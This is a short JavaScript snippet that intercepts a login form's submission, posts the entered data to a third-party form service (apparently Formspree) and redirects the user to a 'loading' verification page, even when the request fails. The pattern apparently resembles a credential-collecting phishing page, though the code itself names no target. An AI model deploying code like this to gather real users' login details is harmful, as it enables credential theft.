
// Attach the form submit event listener
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the default form submission to avoid Formspree's page
  
    var form = event.target;
    var formData = new FormData(form);
  
    // Use Fetch API to submit the form data asynchronously (AJAX)
    fetch(form.action, {
      method: 'POST',
      body: formData,
    })
    .then(response => {
      if (response.ok) {
        // If the form submission is successful, redirect to verification page
        window.location.href = 'loading.html';
      } else {
        // If the submission failed, redirect to failure page
        window.location.href = 'failure.html';
      }
    })
    .catch(error => {
      // If there's a network error, handle it and redirect to failure page
      console.error('Error submitting form:', error);
      window.location.href = 'loading.html';
    });
    
  });

 

   
 




 

  